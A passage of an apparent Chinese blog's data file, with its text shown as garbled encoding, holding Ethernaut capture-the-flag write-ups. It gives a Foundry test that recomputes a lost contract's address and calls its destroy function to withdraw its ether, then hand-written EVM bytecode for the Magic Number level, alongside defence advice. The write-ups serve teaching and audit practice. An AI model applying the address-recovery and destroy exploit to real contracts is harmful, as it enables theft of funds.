åˆçº¦å¹¶è®©å®ƒåˆ›å»ºä¸€ä¸ª SimpleToken</span><br><span class=\"line\">        vm.deal(address(this), 0.001 ether);</span><br><span class=\"line\">        recoveryInstance = new Recovery();</span><br><span class=\"line\">        recoveryInstance.generateToken&#123;value: 0.001 ether&#125;(&quot;MyToken&quot;, 100);</span><br><span class=\"line\"></span><br><span class=\"line\">        attack = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player, player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 1: è®¡ç®—ä¸¢å¤±çš„ SimpleToken åˆçº¦åœ°å€</span><br><span class=\"line\">        address payable lostContract = payable(attack.calculate(address(recoveryInstance)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯ä½™é¢æ˜¯å¦æ­£ç¡®</span><br><span class=\"line\">        assertEq(lostContract.balance, 0.001 ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 2: è°ƒç”¨ destroy å‡½æ•°å–å›èµ„é‡‘</span><br><span class=\"line\">        SimpleToken(lostContract).destroy(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯èµ„é‡‘æ˜¯å¦å·²å–å›</span><br><span class=\"line\">        assertEq(lostContract.balance, 0);</span><br><span class=\"line\">        // æ³¨æ„: player çš„æœ€ç»ˆä½™é¢ä¼šç•¥ä½äºåˆå§‹å€¼ï¼Œå› ä¸ºæœ‰ gas æ¶ˆè€—</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>è·å–éƒ¨ç½²è€…åœ°å€</strong>: ç¡®å®šåˆ›å»º <code>SimpleToken</code> çš„åˆçº¦åœ°å€ï¼Œå³ <code>Recovery</code> åˆçº¦çš„åœ°å€ã€‚</li>\n<li><strong>è®¡ç®—åˆçº¦åœ°å€</strong>: ä½¿ç”¨ <code>keccak256(rlp([deployer_address, nonce]))</code> å…¬å¼è®¡ç®—å‡º <code>SimpleToken</code> çš„åœ°å€ã€‚<code>nonce</code> ä¸º1ã€‚</li>\n<li><strong>è°ƒç”¨ <code>destroy</code></strong>: è·å– <code>SimpleToken</code> åˆçº¦çš„å®ä¾‹ï¼Œå¹¶è°ƒç”¨å…¶ <code>destroy</code> å‡½æ•°ï¼Œå°†èµ„é‡‘è½¬ç§»åˆ° <code>player</code> åœ°å€ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>è¿”å›åˆ›å»ºçš„åˆçº¦åœ°å€</strong>: å·¥å‚åˆçº¦åœ¨åˆ›å»ºæ–°åˆçº¦æ—¶ï¼Œåº”è¯¥æ€»æ˜¯è¿”å›æ–°åˆ›å»ºçš„åˆçº¦åœ°å€ï¼Œæˆ–è€…è§¦å‘ä¸€ä¸ªåŒ…å«è¯¥åœ°å€çš„äº‹ä»¶ã€‚è¿™æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ç¼–ç¨‹å®è·µã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä¿®å¤å»ºè®®</span><br><span class=\"line\">function generateToken(string memory _name, uint256 _initialSupply) public payable returns (address) &#123;</span><br><span class=\"line\">    SimpleToken token = new SimpleToken(_name, _initialSupply);</span><br><span class=\"line\">    token.transfer(msg.sender, msg.value);</span><br><span class=\"line\">    emit TokenCreated(address(token)); // è§¦å‘äº‹ä»¶</span><br><span class=\"line\">    return address(token); // è¿”å›åœ°å€</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ä½¿ç”¨ <code>CREATE2</code></strong>: å¦‚æœéœ€è¦æ›´å¼ºçš„åœ°å€ç¡®å®šæ€§ï¼ˆä¾‹å¦‚ï¼Œåœ¨åˆçº¦éƒ¨ç½²å‰å°±ä¸å…¶äº¤äº’ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ <code>CREATE2</code> æ“ä½œç ã€‚<code>CREATE2</code> å…è®¸æ ¹æ®éƒ¨ç½²è€…åœ°å€ã€ä¸€ä¸ª <code>salt</code> å€¼å’Œåˆçº¦çš„åˆå§‹åŒ–ä»£ç æ¥é¢„è®¡ç®—åœ°å€ï¼Œæä¾›äº†æ›´å¤§çš„çµæ´»æ€§ã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>åœ°å€ç¡®å®šæ€§è®¡ç®—</strong>: ç†è§£åˆçº¦åœ°å€æ˜¯å¦‚ä½•ä»éƒ¨ç½²è€…åœ°å€å’Œ <code>nonce</code> ç”Ÿæˆçš„ï¼Œæ˜¯EVMçš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µã€‚</li>\n<li><strong>RLP (Recursive-Length Prefix)</strong>: ä»¥å¤ªåŠç”¨äºåºåˆ—åŒ–å¯¹è±¡çš„ä¸»è¦ç¼–ç æ–¹æ³•ã€‚è™½ç„¶åœ¨é«˜çº§Solidityç¼–ç¨‹ä¸­ä¸å¸¸ç›´æ¥ä½¿ç”¨ï¼Œä½†ç†è§£å…¶åŸºæœ¬åŸç†æœ‰åŠ©äºæ·±å…¥äº†è§£EVMçš„å†…éƒ¨å·¥ä½œæ–¹å¼ã€‚</li>\n<li><strong><code>keccak256</code></strong>: ä»¥å¤ªåŠä¸­æ— å¤„ä¸åœ¨çš„å“ˆå¸Œå‡½æ•°ï¼Œç”¨äºåœ°å€ç”Ÿæˆã€å‡½æ•°ç­¾åã€æ•°æ®æ ¡éªŒç­‰å¤šç§åœºæ™¯ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åˆçº¦åœ°å€æ˜¯ç¡®å®šæ€§çš„ï¼Œå¯ä»¥é¢„å…ˆè®¡ç®—ã€‚</li>\n<li>åœ°å€çš„è®¡ç®—ä¾èµ–äºéƒ¨ç½²è€…çš„åœ°å€å’Œå…¶ <code>nonce</code>ã€‚</li>\n<li>RLPç¼–ç æ˜¯ä»¥å¤ªåŠåºåˆ—åŒ–æ•°æ®çš„åŸºç¡€ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>å½“å·¥å‚åˆçº¦æ²¡æœ‰è¿”å›æˆ–è®°å½•å…¶åˆ›å»ºçš„å­åˆçº¦åœ°å€æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡é“¾ä¸Šæ•°æ®ï¼ˆéƒ¨ç½²è€…åœ°å€å’Œ <code>nonce</code>ï¼‰è‡ªè¡Œè®¡ç®—å‡ºè¯¥åœ°å€ã€‚</li>\n<li>ä¸€æ—¦æ‰¾åˆ°åœ°å€ï¼Œå°±å¯ä»¥ä¸è¯¥åˆçº¦è¿›è¡Œäº¤äº’ï¼Œåˆ©ç”¨å…¶å†…éƒ¨çš„ä»»ä½•å‡½æ•°ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„ <code>destroy</code>ï¼‰ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>å·¥å‚åˆçº¦åº”å§‹ç»ˆé€šè¿‡è¿”å›å€¼æˆ–äº‹ä»¶æ¥æš´éœ²å…¶åˆ›å»ºçš„å­åˆçº¦åœ°å€ã€‚</li>\n<li>åœ¨è®¾è®¡åˆçº¦æ—¶ï¼Œéµå¾ªè‰¯å¥½çš„ç¼–ç¨‹å®è·µï¼Œç¡®ä¿æ‰€æœ‰é‡è¦çš„ä¿¡æ¯éƒ½æ˜¯å¯è®¿é—®çš„ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-20\">EIP-20: Contract Address Calculation</a></li>\n<li><a href=\"https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/\">Ethereum Docs: RLP (Recursive-Length Prefix)</a></li>\n<li><a href=\"https://ethereum.stackexchange.com/questions/760/how-is-an-ethereum-address-created\">StackExchange: How is an Ethereum address created?</a></li>\n</ul>\n"},{"title":"Ethernaut Level 18: Magic Number - æ‰‹å†™EVMå­—èŠ‚ç ","date":"2025-01-25T08:35:00.000Z","updated":"2025-01-25T08:35:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥EVMåº•å±‚ï¼Œå­¦ä¹ å¦‚ä½•æ‰‹åŠ¨ç¼–å†™åˆçº¦çš„åˆ›å»ºå’Œè¿è¡Œæ—¶å­—èŠ‚ç ã€‚ç†è§£ `creation code` å’Œ `runtime code` çš„åŒºåˆ«ï¼ŒæŒæ¡ `PUSH1`, `MSTORE`, `CODECOPY`, `RETURN` ç­‰æ ¸å¿ƒæ“ä½œç ï¼Œå®Œæˆ Magic Number å…³å¡çš„æŒ‘æˆ˜ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 18: Magic Number - æ‰‹å†™EVMå­—èŠ‚ç \n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 18 - Magic Number](https://ethernaut.openzeppelin.com/level/18)  \n> **æ”»å‡»ç±»å‹**: EVMå­—èŠ‚ç ç¼–å†™  \n> **éš¾åº¦**: â­â­â­â­â­\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä½ éœ€è¦éƒ¨ç½²ä¸€ä¸ªåˆçº¦ï¼Œå®ƒå¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š\n1.  å®ƒçš„è¿è¡Œæ—¶å­—èŠ‚ç ï¼ˆ`runtime bytecode`ï¼‰å¤§å°ä¸èƒ½è¶…è¿‡10ä¸ªå­—èŠ‚ã€‚\n2.  å½“è°ƒç”¨å®ƒçš„ `whatIsTheMeaningOfLife()` å‡½æ•°æ—¶ï¼Œå¿…é¡»è¿”å› `42`ã€‚\n\n![Magic Number Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel18.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè¿™ä¸ªæŒ‘æˆ˜å°†æˆ‘ä»¬å¸¦å…¥EVMçš„åº•å±‚ã€‚ä½¿ç”¨Solidityç¼–å†™ä¸€ä¸ªè¿”å›42çš„å‡½æ•°éå¸¸ç®€å•ï¼Œä½†ç¼–è¯‘åçš„å­—èŠ‚ç ä¼šè¿œè¿œè¶…è¿‡10å­—èŠ‚çš„é™åˆ¶ï¼Œå› ä¸ºå®ƒåŒ…å«äº†å‡½æ•°è°ƒåº¦å™¨ã€å®‰å…¨æ£€æŸ¥ç­‰å¤§é‡é¢å¤–ä»£ç ã€‚\n\n```solidity\n// ç¼–è¯‘åå­—èŠ‚ç ä¼šå¾ˆé•¿ï¼Œæ— æ³•é€šè¿‡å…³å¡\ncontract NormalSolver {\n    function whatIsTheMeaningOfLife() public pure returns (uint256) {\n        return 42;\n    }\n}\n```\n\nå› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨ç¼–å†™EVMå­—èŠ‚ç ã€‚æˆ‘ä»¬éœ€è¦åˆ†åˆ«æ„å»ºä¸¤éƒ¨åˆ†ä»£ç ï¼š\n\n1.  **è¿è¡Œæ—¶ä»£ç  (Runtime Code)**: è¿™æ˜¯æœ€ç»ˆå­˜å‚¨åœ¨é“¾ä¸Šçš„ä»£ç ï¼Œè´Ÿè´£åœ¨è¢«è°ƒç”¨æ—¶è¿”å›42ã€‚è¿™éƒ¨åˆ†ä»£ç çš„é•¿åº¦å¿…é¡»å°äºç­‰äº10å­—èŠ‚ã€‚\n2.  **åˆ›å»ºä»£ç  (Creation Code)**: è¿™æ˜¯éƒ¨ç½²åˆçº¦æ—¶æ‰§è¡Œçš„ä»£ç ã€‚å®ƒçš„ä»»åŠ¡åªæœ‰ä¸€ä¸ªï¼šå°†è¿è¡Œæ—¶ä»£ç è¿”å›ï¼Œä»¥ä¾¿EVMå°†å…¶å­˜å‚¨ä¸ºæ–°åˆçº¦çš„ä»£ç ã€‚\n\n### 1. æ„å»ºè¿è¡Œæ—¶ä»£ç  (Runtime Code)\n\næˆ‘ä»¬çš„è¿è¡Œæ—¶ä»£ç éœ€è¦åšä¸¤ä»¶äº‹ï¼š\n1.  å°†æ•°å­— `42` (åå…­è¿›åˆ¶ä¸º `0x2a`) æ”¾å…¥å†…å­˜ã€‚\n2.  ä»å†…å­˜ä¸­è¿”å›è¿™ä¸ªæ•°å­—ã€‚\n\nè¿™éœ€è¦ä»¥ä¸‹æ“ä½œç ï¼ˆOpcodesï¼‰ï¼š\n\n| Opcode | åç§°   | ä½œç”¨                               |\n| :----- | :----- | :--------------------------------- |\n| `0x60` | `PUSH1`| å°†1ä¸ªå­—èŠ‚çš„æ•°æ®å‹å…¥å †æ ˆã€‚          |\n| `0x52` | `MSTORE`| `MSTORE(p, v)`: å°†å€¼ `v` å­˜å…¥å†…å­˜åœ°å€ `p`ã€‚ |\n| `0xf3` | `RETURN`| `RETURN(p, s)`: ä»å†…å­˜åœ°å€ `p` å¼€å§‹ï¼Œè¿”å› `s` å­—èŠ‚çš„æ•°æ®ã€‚ |\n\næ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š\n1.  `PUSH1 0x2a`: å°† `42` å‹å…¥å †æ ˆã€‚\n2.  `PUSH1 0x80`: å°†å†…å­˜åœ°å€ `0x80` å‹å…¥å †æ ˆã€‚ï¼ˆ`0x80` æ˜¯Solidityä¸­è‡ªç”±å†…å­˜æŒ‡é’ˆçš„èµ·å§‹ä½ç½®ï¼Œä½¿ç”¨å®ƒæ˜¯æƒ¯ä¾‹ï¼‰ã€‚\n3.  `MSTORE`: `mstore(0x80, 0x2a)`ï¼Œå°† `42` å­˜å…¥å†…å­˜ã€‚\n4.  `PUSH1 0x20`: å°†è¿”å›å€¼å¤§å° `32` å­—èŠ‚ï¼ˆä¸€ä¸ª `uint256`ï¼‰å‹å…¥å †æ ˆã€‚\n5.  `PUSH1 0x80`: å°†è¿”å›çš„å†…å­˜åœ°å€ `0x80` å‹å…¥å †æ ˆã€‚\n6.  `RETURN`: `return(0x80, 0x20)`ï¼Œè¿”å›ç»“æœã€‚\n\nå°†è¿™äº›æ­¥éª¤è½¬æ¢ä¸ºå­—èŠ‚ç ï¼š\n`602a` `6080` `52` `6020` `6080` `f3`\n\nè¿™ä¸ªå­—èŠ‚ç çš„é•¿åº¦æ˜¯10å­—èŠ‚ï¼š`0x602a60805260206080f3`ã€‚å®Œç¾ç¬¦åˆè¦æ±‚ï¼\n\n### 2. æ„å»ºåˆ›å»ºä»£ç  (Creation Code)\n\nåˆ›å»ºä»£ç çš„ä»»åŠ¡æ˜¯å°†ä¸Šé¢çš„10å­—èŠ‚è¿è¡Œæ—¶ä»£ç è¿”å›ç»™EVMã€‚å®ƒéœ€è¦åšä¸¤ä»¶äº‹ï¼š\n1.  å°†è¿è¡Œæ—¶ä»£ç ä»åˆ›å»ºä»£ç çš„æœ«å°¾å¤åˆ¶åˆ°å†…å­˜ä¸­ã€‚\n2.  ä»å†…å­˜ä¸­è¿”å›è¿™æ®µè¿è¡Œæ—¶ä»£ç ã€‚\n\nè¿™éœ€è¦ `CODECOPY` æ“ä½œç ï¼š\n\n| Opcode | åç§°     | ä½œç”¨                               |\n| :----- | :------- | :--------------------------------- |\n| `0x39` | `CODECOPY`| `CODECOPY(d, p, s)`: ä»ä»£ç çš„ `p` ä½ç½®å¼€å§‹ï¼Œå¤åˆ¶ `s` å­—èŠ‚åˆ°å†…å­˜çš„ `d` ä½ç½®ã€‚ |\n\næ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š\n1.  å°†è¿è¡Œæ—¶ä»£ç å¤åˆ¶åˆ°å†…å­˜ `0x00` å¤„ã€‚\n2.  ä»å†…å­˜ `0x00` å¤„è¿”å›10å­—èŠ‚çš„ä»£ç ã€‚\n\nå­—èŠ‚ç å¦‚ä¸‹ï¼š\n-   `600a`: `PUSH1 0x0a` (è¿è¡Œæ—¶ä»£ç é•¿åº¦: 10å­—èŠ‚)\n-   `600c`: `PUSH1 0x0c` (è¿è¡Œæ—¶ä»£ç åœ¨åˆ›å»ºä»£ç ä¸­çš„èµ·å§‹ä½ç½®: ç¬¬12å­—èŠ‚)\n-   `6000`: `PUSH1 0x00` (ç›®æ ‡å†…å­˜åœ°å€: 0)\n-   `39`: `CODECOPY`\n-   `600a`: `PUSH1 0x0a` (è¦è¿”å›çš„æ•°æ®é•¿åº¦: 10å­—èŠ‚)\n-   `6000`: `PUSH1 0x00` (è¦è¿”å›çš„å†…å­˜åœ°å€: 0)\n-   `f3`: `RETURN`\n\nåˆ›å»ºä»£ç ä¸º: `0x600a600c600039600a6000f3`ã€‚å®ƒçš„é•¿åº¦æ˜¯12å­—èŠ‚ã€‚\n\n### 3. ç»„åˆæœ€ç»ˆå­—èŠ‚ç \n\næœ€ç»ˆéƒ¨ç½²çš„å­—èŠ‚ç æ˜¯ **åˆ›å»ºä»£ç  + è¿è¡Œæ—¶ä»£ç **ï¼š\n`0x600a600c600039600a6000f3` + `602a60805260206080f3`\n\næœ€ç»ˆå­—èŠ‚ç : `0x600a600c600039600a6000f3602a60805260206080f3`\n\n## ğŸ’» Foundry å®ç°\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Foundry çš„å†…è”æ±‡ç¼–å’Œ `create` æ“ä½œç æ¥éƒ¨ç½²è¿™æ®µå­—èŠ‚ç ã€‚\n\n### Foundry æµ‹è¯•ä»£ç \n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/18_MagicNumber.sol\";\n\ninterface ISolver {\n    function whatIsTheMeaningOfLife() external view returns (uint256);\n}\n\ncontract MagicNumberTest is Test {\n    MagicNum instance;\n    Attack attack;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        attack = new Attack();\n        instance = new MagicNum();\n    }\n\n    function testAttacker() public {\n        // éƒ¨ç½²æˆ‘ä»¬çš„æ‰‹å†™å­—èŠ‚ç åˆçº¦\n        address solverAddress = attack.deploySolver();\n        instance.setSolver(solverAddress);\n\n        // éªŒè¯è¿”å›å€¼æ˜¯å¦ä¸º 42\n        assertEq(ISolver(solverAddress).whatIsTheMeaningOfLife(), 42);\n\n        // éªŒè¯å­—èŠ‚ç é•¿åº¦æ˜¯å¦ä¸º 10\n        uint256 size;\n        assembly {\n            size := extcodesize(solverAddress)\n        }\n        assertEq(size, 10);\n    }\n}\n\ncontract Attack {\n    function deploySolver() public returns (address) {\n        address solver;\n        // æœ€ç»ˆçš„éƒ¨ç½²å­—èŠ‚ç \n        bytes memory bytecode = hex\"600a600c600039600a6000f3602a60805260206080f3\";\n        \n        assembly {\n            // create(v, p, s): éƒ¨ç½²åˆçº¦\n            // v: å‘é€çš„ ether å€¼ (0)\n            // p: å­—èŠ‚ç åœ¨å†…å­˜ä¸­çš„ä½ç½® (bytecode + 0x20)\n            // s: å­—èŠ‚ç çš„é•¿åº¦ (mload(bytecode))\n            solver := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n        return solver;\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **è®¾è®¡è¿è¡Œæ—¶ä»£ç **: ç²¾å¿ƒè®¾è®¡ä¸€æ®µä¸è¶…è¿‡10å­—èŠ‚çš„ä»£ç ï¼Œä½¿å…¶èƒ½å¤Ÿè¿”å› `42`ã€‚\n2.  **è®¾è®¡åˆ›å»ºä»£ç **: è®¾è®¡ä¸€æ®µä»£ç ï¼Œå…¶åŠŸèƒ½æ˜¯è¿”å›ç¬¬ä¸€æ­¥ä¸­è®¾è®¡çš„è¿è¡Œæ—¶ä»£ç ã€‚\n3.  **ç»„åˆå­—èŠ‚ç **: å°†åˆ›å»ºä»£ç å’Œè¿è¡Œæ—¶ä»£ç æ‹¼æ¥æˆæœ€ç»ˆçš„éƒ¨ç½²å­—èŠ‚ç ã€‚\n4.  **éƒ¨ç½²**: ä½¿ç”¨ `create` æ“ä½œç ï¼ˆå¯ä»¥é€šè¿‡å†…è”æ±‡ç¼–æˆ–å‘é€è£¸äº¤æ˜“ï¼‰æ¥éƒ¨ç½²è¿™æ®µå­—èŠ‚ç ï¼Œå¾—åˆ°æ±‚è§£å™¨åˆçº¦çš„åœ°å€ã€‚\n5.  **æäº¤**: å°†æ±‚è§£å™¨åˆçº¦çš„åœ°å€æäº¤ç»™ `Ethernaut` å…³å¡ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\nè¿™ä¸ªå…³å¡æœ¬èº«ä¸æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œè€Œæ˜¯ä¸€ä¸ªEVMç¼–ç¨‹çš„ç»ƒä¹ ã€‚ç„¶è€Œï¼Œå®ƒæ­ç¤ºäº†åœ¨è¿›è¡Œå­—èŠ‚ç çº§åˆ«çš„å®¡è®¡æ—¶éœ€è¦æ³¨æ„çš„äº‹é¡¹ï¼š\n\n-   **ç†è§£åº•å±‚æ“ä½œ**: ä»…ä»…å®¡è®¡Solidityä»£ç å¯èƒ½ä¸è¶³ä»¥å‘ç°æ‰€æœ‰é—®é¢˜ã€‚å¯¹äºé«˜åº¦ä¼˜åŒ–çš„æˆ–ä½¿ç”¨å†…è”æ±‡ç¼–çš„åˆçº¦ï¼Œå¿…é¡»ç†è§£å…¶ç”Ÿæˆçš„EVMæ“ä½œç çš„å®é™…è¡Œä¸ºã€‚\n-   **è­¦æƒ•ä¸å¯»å¸¸çš„éƒ¨ç½²æ¨¡å¼**: å¦‚æœä¸€ä¸ªåˆçº¦çš„åˆ›å»ºè¿‡ç¨‹ä¸æ ‡å‡†ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨è£¸ `create` æˆ– `create2`ï¼‰ï¼Œéœ€è¦ç‰¹åˆ«å®¡æŸ¥å…¶å­—èŠ‚ç çš„æ¥æºå’ŒåŠŸèƒ½ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **EVM Opcodes**: EVMçš„æ“ä½œç æ˜¯å…¶æ‰§è¡Œæ‰€æœ‰è®¡ç®—çš„åŸºç¡€ã€‚`evm.codes` æ˜¯ä¸€ä¸ªæå¥½çš„äº¤äº’å¼å‚è€ƒç½‘ç«™ã€‚\n-   **å†…è”æ±‡ç¼– (`assembly`)**: Solidityå…è®¸åœ¨ä»£ç ä¸­ç›´æ¥åµŒå…¥æ±‡ç¼–è¯­è¨€ï¼Œæä¾›äº†å¯¹EVMæ›´åº•å±‚çš„æ§åˆ¶ï¼Œä½†åŒæ—¶ä¹Ÿå¸¦æ¥äº†æ›´å¤§çš„é£é™©å’Œå¤æ‚æ€§ã€‚\n-   **`create` æ“ä½œç **: ç”¨äºä»ä»£ç ä¸­éƒ¨ç½²æ–°åˆçº¦ã€‚\n-   **`extcodesize` æ“ä½œç **: ç”¨äºè·å–ä¸€ä¸ªåœ°å€ä¸Šçš„ä»£ç å¤§å°ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   åˆçº¦çš„å­—èŠ‚ç åˆ†ä¸º `creation code` å’Œ `runtime code`ã€‚\n-   `creation code` åœ¨éƒ¨ç½²æ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œå…¶è¿”å›å€¼æ˜¯ `runtime code`ã€‚\n-   `runtime code` æ˜¯æ°¸ä¹…å­˜å‚¨åœ¨é“¾ä¸Šçš„ä»£ç ï¼Œå“åº”å¤–éƒ¨è°ƒç”¨ã€‚\n-   é€šè¿‡ç›´æ¥æ“ä½œEVMæ“ä½œç ï¼Œå¯ä»¥åˆ›å»ºå‡ºéå¸¸ç´§å‡‘å’Œé«˜æ•ˆçš„åˆçº¦ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   é€šè¿‡æ‰‹å†™æ±‡ç¼–ï¼Œç»•è¿‡é«˜çº§è¯­è¨€çš„é™åˆ¶ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„ä»£ç å¤§å°é™åˆ¶ï¼‰ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   åœ¨å®‰å…¨å®¡è®¡ä¸­ï¼Œä¸èƒ½å¿½è§†å¯¹åº•å±‚å­—èŠ‚ç å’Œæ±‡ç¼–çš„åˆ†æï¼Œç‰¹åˆ«æ˜¯å½“åˆçº¦è¡Œä¸ºä¸å¯»å¸¸æ—¶ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [EVM Codes - An Interactive Reference](https://www.evm.codes/)\n-   [Deconstructing a Solidity Contract](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737)\n-   [Solidity Docs: Inline Assembly](https://docs.soliditylang.org/en/latest/assembly.html)","source":"_posts/ethernaut-level-18-magic-number.md","raw":"---\ntitle: 'Ethernaut Level 18: Magic Number - æ‰‹å†™EVMå­—èŠ‚ç '\ndate: 2025-01-25 16:35:00\nupdated: 2025-01-25 16:35:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - è¿›é˜¶æ”»å‡»ç¯‡ (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - EVM\n  - Bytecode\n  - Assembly\n  - Opcodes\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥EVMåº•å±‚ï¼Œå­¦ä¹ å¦‚ä½•æ‰‹åŠ¨ç¼–å†™åˆçº¦çš„åˆ›å»ºå’Œè¿è¡Œæ—¶å­—èŠ‚ç ã€‚ç†è§£ `creation code` å’Œ `runtime code` çš„åŒºåˆ«ï¼ŒæŒæ¡ `PUSH1`, `MSTORE`, `CODECOPY`, `RETURN` ç­‰æ ¸å¿ƒæ“ä½œç ï¼Œå®Œæˆ Magic Number å…³å¡çš„æŒ‘æˆ˜ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 18: Magic Number - æ‰‹å†™EVMå­—èŠ‚ç \n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 18 - Magic Number](https://ethernaut.openzeppelin.com/level/18)  \n> **æ”»å‡»ç±»å‹**: EVMå­—èŠ‚ç ç¼–å†™  \n> **éš¾åº¦**: â­â­â­â­â­\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nä½ éœ€è¦éƒ¨ç½²ä¸€ä¸ªåˆçº¦ï¼Œå®ƒå¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š\n1.  å®ƒçš„è¿è¡Œæ—¶å­—èŠ‚ç ï¼ˆ`runtime bytecode`ï¼‰å¤§å°ä¸èƒ½è¶…è¿‡10ä¸ªå­—èŠ‚ã€‚\n2.  å½“è°ƒç”¨å®ƒçš„ `whatIsTheMeaningOfLife()` å‡½æ•°æ—¶ï¼Œå¿…é¡»è¿”å› `42`ã€‚\n\n![Magic Number Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel18.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\nè¿™ä¸ªæŒ‘æˆ˜å°†æˆ‘ä»¬å¸¦å…¥EVMçš„åº•å±‚ã€‚ä½¿ç”¨Solidityç¼–å†™ä¸€ä¸ªè¿”å›42çš„å‡½æ•°éå¸¸ç®€å•ï¼Œä½†ç¼–è¯‘åçš„å­—èŠ‚ç ä¼šè¿œè¿œè¶…è¿‡10å­—èŠ‚çš„é™åˆ¶ï¼Œå› ä¸ºå®ƒåŒ…å«äº†å‡½æ•°è°ƒåº¦å™¨ã€å®‰å…¨æ£€æŸ¥ç­‰å¤§é‡é¢å¤–ä»£ç ã€‚\n\n```solidity\n// ç¼–è¯‘åå­—èŠ‚ç ä¼šå¾ˆé•¿ï¼Œæ— æ³•é€šè¿‡å…³å¡\ncontract NormalSolver {\n    function whatIsTheMeaningOfLife() public pure returns (uint256) {\n        return 42;\n    }\n}\n```\n\nå› 